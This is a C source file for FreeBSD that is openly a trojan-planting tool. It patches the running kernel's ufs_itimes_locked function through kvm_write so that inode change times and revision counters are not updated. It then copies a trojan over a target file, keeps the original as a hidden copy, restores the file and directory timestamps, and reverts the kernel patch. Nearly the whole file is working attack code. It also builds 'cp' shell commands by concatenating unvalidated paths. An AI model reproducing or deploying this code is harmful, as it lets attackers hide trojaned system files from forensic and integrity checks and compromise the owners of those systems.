#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <utime.h>
#include "magick.h"

#define SIZE 450

/* Replacement code. */
unsigned char	nop_code3[] =
"\x90\x90\x90";
unsigned char	nop_code4[] =
"\x90\x90\x90\x90";
unsigned char	nop_code5[] =
"\x90\x90\x90\x90\x90";
unsigned char	nop_code8[] =
"\x90\x90\x90\x90\x90\x90\x90\x90";

/**
 * Output of "llvm-objdump -dr /boot/kernel/kernel | less"
 * then search for "<ufs_itimes_locked>:"
 
ffffffff80ee4d60 <ufs_itimes_locked>:
ffffffff80ee4d60: 55                    pushq   %rbp
ffffffff80ee4d61: 48 89 e5              movq    %rsp, %rbp
ffffffff80ee4d64: 41 56                 pushq   %r14
ffffffff80ee4d66: 53                    pushq   %rbx
ffffffff80ee4d67: 48 83 ec 10           subq    $16, %rsp
ffffffff80ee4d6b: 48 89 fb              movq    %rdi, %rbx
ffffffff80ee4d6e: 4c 8b 77 18           movq    24(%rdi), %r14
ffffffff80ee4d72: 49 8b 46 18           movq    24(%r14), %rax
ffffffff80ee4d76: 4c 89 f7              movq    %r14, %rdi
ffffffff80ee4d79: ff 90 d8 01 00 00     callq   *472(%rax)
ffffffff80ee4d7f: 85 c0                 testl   %eax, %eax
ffffffff80ee4d81: 74 0e                 je      0xffffffff80ee4d91 <ufs_itimes_locked+0x31>
ffffffff80ee4d83: 41 80 66 48 f8        andb    $-8, 72(%r14)
ffffffff80ee4d88: 48 83 c4 10           addq    $16, %rsp
ffffffff80ee4d8c: 5b                    popq    %rbx
ffffffff80ee4d8d: 41 5e                 popq    %r14
ffffffff80ee4d8f: 5d                    popq    %rbp
ffffffff80ee4d90: c3                    retq
ffffffff80ee4d91: 41 8b 46 48           movl    72(%r14), %eax
ffffffff80ee4d95: a8 07                 testb   $7, %al
ffffffff80ee4d97: 74 ef                 je      0xffffffff80ee4d88 <ufs_itimes_locked+0x28>
ffffffff80ee4d99: 8a 0b                 movb    (%rbx), %cl
ffffffff80ee4d9b: 80 c1 fd              addb    $-3, %cl
ffffffff80ee4d9e: 48 8b 53 20           movq    32(%rbx), %rdx
ffffffff80ee4da2: 80 f9 01              cmpb    $1, %cl
ffffffff80ee4da5: 77 0b                 ja      0xffffffff80ee4db2 <ufs_itimes_locked+0x52>
ffffffff80ee4da7: b9 20 00 00 00        movl    $32, %ecx
ffffffff80ee4dac: f6 42 0a 20           testb   $32, 10(%rdx)
ffffffff80ee4db0: 74 1c                 je      0xffffffff80ee4dce <ufs_itimes_locked+0x6e>
ffffffff80ee4db2: b9 08 00 00 00        movl    $8, %ecx
ffffffff80ee4db7: a8 06                 testb   $6, %al
ffffffff80ee4db9: 75 13                 jne     0xffffffff80ee4dce <ufs_itimes_locked+0x6e>
ffffffff80ee4dbb: be 00 00 00 18        movl    $402653184, %esi
ffffffff80ee4dc0: 23 72 04              andl    4(%rdx), %esi
ffffffff80ee4dc3: 74 09                 je      0xffffffff80ee4dce <ufs_itimes_locked+0x6e>
ffffffff80ee4dc5: b9 40 00 00 00        movl    $64, %ecx
ffffffff80ee4dca: a8 01                 testb   $1, %al
ffffffff80ee4dcc: 74 0f                 je      0xffffffff80ee4ddd <ufs_itimes_locked+0x7d>
ffffffff80ee4dce: 49 8b 7e 10           movq    16(%r14), %rdi
ffffffff80ee4dd2: 09 c8                 orl     %ecx, %eax
ffffffff80ee4dd4: 41 89 46 48           movl    %eax, 72(%r14)
ffffffff80ee4dd8: e8 63 83 e0 ff        callq   0xffffffff80ced140 <vlazy>
ffffffff80ee4ddd: 48 8d 7d e0           leaq    -32(%rbp), %rdi
ffffffff80ee4de1: e8 7a 48 e0 ff        callq   0xffffffff80ce9660 <vfs_timestamp>
ffffffff80ee4de6: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80ee4dea: f6 c1 01              testb   $1, %cl
ffffffff80ee4ded: 74 3b                 je      0xffffffff80ee4e2a <ufs_itimes_locked+0xca>
ffffffff80ee4def: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80ee4df3: f7 c1 00 04 00 00     testl   $1024, %ecx
ffffffff80ee4df9: 75 09                 jne     0xffffffff80ee4e04 <ufs_itimes_locked+0xa4>
ffffffff80ee4dfb: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4dff: 89 41 10              movl    %eax, 16(%rcx)
ffffffff80ee4e02: eb 08                 jmp     0xffffffff80ee4e0c <ufs_itimes_locked+0xac>
ffffffff80ee4e04: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4e08: 48 89 41 20           movq    %rax, 32(%rcx)
ffffffff80ee4e0c: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80ee4e11: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80ee4e14: 75 0a                 jne     0xffffffff80ee4e20 <ufs_itimes_locked+0xc0>
ffffffff80ee4e16: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4e1a: 48 83 c1 14           addq    $20, %rcx
ffffffff80ee4e1e: eb 08                 jmp     0xffffffff80ee4e28 <ufs_itimes_locked+0xc8>
ffffffff80ee4e20: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4e24: 48 83 c1 44           addq    $68, %rcx
ffffffff80ee4e28: 89 01                 movl    %eax, (%rcx)
ffffffff80ee4e2a: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80ee4e2e: f6 c1 04              testb   $4, %cl
ffffffff80ee4e31: 74 37                 je      0xffffffff80ee4e6a <ufs_itimes_locked+0x10a>
ffffffff80ee4e33: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80ee4e37: f7 c1 00 04 00 00     testl   $1024, %ecx
ffffffff80ee4e3d: 75 09                 jne     0xffffffff80ee4e48 <ufs_itimes_locked+0xe8>
ffffffff80ee4e3f: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4e43: 89 41 18              movl    %eax, 24(%rcx)
ffffffff80ee4e46: eb 08                 jmp     0xffffffff80ee4e50 <ufs_itimes_locked+0xf0>
ffffffff80ee4e48: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4e4c: 48 89 41 28           movq    %rax, 40(%rcx)
ffffffff80ee4e50: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80ee4e55: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80ee4e58: 75 09                 jne     0xffffffff80ee4e63 <ufs_itimes_locked+0x103>
ffffffff80ee4e5a: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4e5e: 89 41 1c              movl    %eax, 28(%rcx)
ffffffff80ee4e61: eb 07                 jmp     0xffffffff80ee4e6a <ufs_itimes_locked+0x10a>
ffffffff80ee4e63: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4e67: 89 41 40              movl    %eax, 64(%rcx)
ffffffff80ee4e6a: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80ee4e6e: f6 c1 02              testb   $2, %cl
ffffffff80ee4e71: 0f 84 0c ff ff ff     je      0xffffffff80ee4d83 <ufs_itimes_locked+0x23>
ffffffff80ee4e77: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80ee4e7b: f7 c1 00 04 00 00     testl   $1024, %ecx
ffffffff80ee4e81: 75 09                 jne     0xffffffff80ee4e8c <ufs_itimes_locked+0x12c>
ffffffff80ee4e83: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4e87: 89 41 20              movl    %eax, 32(%rcx)
ffffffff80ee4e8a: eb 08                 jmp     0xffffffff80ee4e94 <ufs_itimes_locked+0x134>
ffffffff80ee4e8c: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4e90: 48 89 41 30           movq    %rax, 48(%rcx)
ffffffff80ee4e94: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80ee4e99: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80ee4e9c: 75 1f                 jne     0xffffffff80ee4ebd <ufs_itimes_locked+0x15d>
ffffffff80ee4e9e: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4ea2: 89 41 24              movl    %eax, 36(%rcx)
ffffffff80ee4ea5: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80ee4eaa: 74 1f                 je      0xffffffff80ee4ecb <ufs_itimes_locked+0x16b>
ffffffff80ee4eac: 49 8b 46 38           movq    56(%r14), %rax
ffffffff80ee4eb0: 48 83 80 e8 00 00 00 01       addq    $1, 232(%rax)
ffffffff80ee4eb8: e9 c6 fe ff ff        jmp     0xffffffff80ee4d83 <ufs_itimes_locked+0x23>
ffffffff80ee4ebd: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80ee4ec1: 89 41 48              movl    %eax, 72(%rcx)
ffffffff80ee4ec4: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80ee4ec9: 75 e1                 jne     0xffffffff80ee4eac <ufs_itimes_locked+0x14c>
ffffffff80ee4ecb: 49 8b 46 38           movq    56(%r14), %rax
ffffffff80ee4ecf: 48 83 40 78 01        addq    $1, 120(%rax)
ffffffff80ee4ed4: e9 aa fe ff ff        jmp     0xffffffff80ee4d83 <ufs_itimes_locked+0x23>
ffffffff80ee4ed9: 0f 1f 80 00 00 00 00  nopl    (%rax)
*/
// Disable ufs_itimes change time code
// Record existing file's access, modification times
// Copy existing file to hidden file location
// Copy trojan file over existing file
// Set trojan file's access and modification times
// Restore ufs_itimes change time code
int main(int argc, char *argv[])
{
   int		   i, offset1, offset2, offset3, offset4, offset5, offset6, fd = -1;
   char		   errbuf[_POSIX2_LINE_MAX];
   kvm_t	  *kd;
   struct nlist	   nl[] = {{NULL}, {NULL},};
   unsigned char   ufs_itimes_code[SIZE];
   struct stat	   sb;
   struct utimbuf  time, file_time;
   char * trojan = NULL;
   char * destination = NULL;
   char * destination_dir = NULL;
   char * pos = NULL;
   size_t dest_dir_str_len = 0;
   int dest_is_file = 0;

   if (argc < 3) {
      printf("[-] Usage: %s [TROJAN FILE] [DESTINATION]\n", argv[0]);
      exit(0);
   }

   trojan = argv[1];
   destination = argv[2];

   if (stat(trojan, &sb) < 0) {
      fprintf(stderr, "[x] STAT ERROR: %d\n", errno);
      exit(-1);
   } else if (!S_ISREG(sb.st_mode)) {
      printf("[x] %s is not a file\n", trojan);
      exit(-1);
   }

   if (stat(destination, &sb) < 0) {
      fprintf(stderr, "[x] STAT ERROR: %d\n", errno);
      exit(-1);
   }

   // Determine if destination a file or directory
   if (S_ISDIR(sb.st_mode)) {
      destination_dir = destination;
   } else if (S_ISREG(sb.st_mode)) {
      dest_is_file = 1;
      file_time.actime = sb.st_atime;
      file_time.modtime = sb.st_mtime;
      // Find last '/' character in destination path
      if ((pos=strrchr(destination, '/')) == NULL) {
         printf("[x] No '/' character found in destination path: %s\n", destination);
         exit(-1);
      }

      dest_dir_str_len = pos - destination;
      printf("[-] Allocating %lu bytes for destination directory\n", dest_dir_str_len);
      destination_dir = malloc(pos-destination);
      strncpy(destination_dir, destination, dest_dir_str_len);
   } else {
      printf("[x] Destination %s is not a directory or file\n", destination);
      exit(-1);
   }

   if (dest_is_file) {
      printf("[-] Destination file is %s\n", destination);
   }

   printf("[-] Destination directory is %s\n", destination_dir);

   /* Initialize kernel virtual memory access. */
   kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
   if (kd == NULL) {
      fprintf(stderr, "[x] ERROR: %s\n", errbuf);
      exit(-1);
   }
   nl[0].n_name = "ufs_itimes_locked";
   if (kvm_nlist(kd, nl) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }
   if (!nl[0].n_value) {
      fprintf(stderr, "[x] ERROR: Symbol %s not found\n",
	      nl[0].n_name);
      exit(-1);
   }
   /* Save a copy of ufs_itimes. */
   if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }
   /*
    * Search through ufs_itimes_locked for the following three lines:
    *
    * DIP_SET(ip, i_ctime, ts.tv_sec);
    *
    * DIP_SET(ip, i_ctimensec, ts.tv_nsec);
    *
    * DIP_SET(ip, i_modrev, DIP(ip, i_modrev) + 1);
    *
    * We will NOP out the lines that write to memory.

ffffffff80ee4e87: 89 41 20              movl    %eax, 32(%rcx)
ffffffff80ee4e90: 48 89 41 30           movq    %rax, 48(%rcx)
ffffffff80ee4ea2: 89 41 24              movl    %eax, 36(%rcx)
ffffffff80ee4eb0: 48 83 80 e8 00 00 00 01       addq    $1, 232(%rax)
ffffffff80ee4ec1: 89 41 48              movl    %eax, 72(%rcx)
ffffffff80ee4ecf: 48 83 40 78 01        addq    $1, 120(%rax)
*/

   for (i = 0; i < SIZE - 7; i++) {
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x20)
	 offset1 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0x89 &&
	  ufs_itimes_code[i + 2] == 0x41 &&
	  ufs_itimes_code[i + 3] == 0x30)
	 offset2 = i;
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x24)
	 offset3 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0x83 &&
	  ufs_itimes_code[i + 2] == 0x80 &&
	  ufs_itimes_code[i + 3] == 0xe8 &&
	  ufs_itimes_code[i + 4] == 0x00 &&
	  ufs_itimes_code[i + 5] == 0x00 &&
	  ufs_itimes_code[i + 6] == 0x00 &&
	  ufs_itimes_code[i + 7] == 0x01)
	 offset4 = i;
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x48)
	 offset5 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0x83 &&
	  ufs_itimes_code[i + 2] == 0x40 &&
	  ufs_itimes_code[i + 3] == 0x78 &&
	  ufs_itimes_code[i + 4] == 0x01)
	 offset6 = i;
   }

   /* Save destination directory access and modification times. */
   if (stat(destination_dir, &sb) < 0) {
      fprintf(stderr, "[x] STAT ERROR: %d\n", errno);
      exit(-1);
   }
   time.actime = sb.st_atime;
   time.modtime = sb.st_mtime;

   if (!dest_is_file) {
      file_time = time;
   }

   /* Patch ufs_itimes. */
   if (kvm_write(kd, nl[0].n_value + offset1, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset1 at %d, ERROR: %s\n",
         offset1, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset2, nop_code4,
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset2 at %d, ERROR: %s\n",
         offset2, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset3, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset3 at %d, ERROR: %s\n",
         offset3, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset4, nop_code8,
		 sizeof(nop_code8) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset4 at %d, ERROR: %s\n",
         offset4, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset5, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset5 at %d, ERROR: %s\n",
         offset5, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset6, nop_code5,
		 sizeof(nop_code5) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset6 at %d, ERROR: %s\n",
         offset6, kvm_geterr(kd));
      exit(-1);
   }

   // Copy existing file to hidden file location
   if (dest_is_file) {
      printf("[-] Copying existing file %s to %s.%s\n", destination, destination, T_NAME);
      char * copy_existing = malloc(3 + strlen(destination) + 1 + strlen(destination) + 1 + strlen(T_NAME));
      pos = copy_existing;
      strcpy(pos, "cp ");
      pos+=3;
      strcpy(pos, destination);
      pos+=strlen(destination);
      strcpy(pos, " ");
      pos++;
      strcpy(pos, destination);
      pos+=strlen(destination);
      strcpy(pos, ".");
      pos++;
      strcpy(pos, T_NAME);

      printf("[-] command = %s\n", copy_existing);
      if (system(copy_existing) < 0) {
         printf("[x] Failed to copy existing file %s to %s.%s\n", destination, destination, T_NAME);
      }

      free(copy_existing);
   }

   /* Copy trojan into DESTINATION. */
   char *string = malloc(3 + strlen(trojan) + 1 + strlen(destination));
   pos = string;
   strcpy(pos, "cp ");
   pos+=3;
   strcpy(pos, trojan);
   pos+=strlen(trojan);
   strcpy(pos, " ");
   pos++;
   strcpy(pos, destination);

   printf("[-] command = %s\n", string);
   if (system(string) < 0) {
      printf("[x] Failed to copy trojan file %s to %s\n", trojan, destination);
   }

   free(string);

   /* Roll back destination directory access and modification times. */
   if (utime(destination, &file_time) < 0) {
      fprintf(stderr, "[x] UTIME ERROR: %d\n", errno);
   }
   /* Restore ufs_itimes_locked. */
   if (utime(destination_dir, &time) < 0) {
      fprintf(stderr, "[x] UTIME ERROR: %d\n", errno);
   }
   /* Restore ufs_itimes_locked. */
   if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset1 at %d, ERROR: %s\n",
         offset1, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2],
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset2 at %d, ERROR: %s\n",
         offset2, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset3, &ufs_itimes_code[offset3],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset3 at %d, ERROR: %s\n",
         offset3, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset4, &ufs_itimes_code[offset4],
		 sizeof(nop_code8) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset4 at %d, ERROR: %s\n",
         offset4, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset5, &ufs_itimes_code[offset5],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset5 at %d, ERROR: %s\n",
         offset5, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset6, &ufs_itimes_code[offset6],
		 sizeof(nop_code5) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset6 at %d, ERROR: %s\n",
         offset6, kvm_geterr(kd));
      exit(-1);
   }
   /* Close kd. */
   if (kvm_close(kd) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }

   printf("[-] Trojan successfully planted\n");
   exit(0);
}
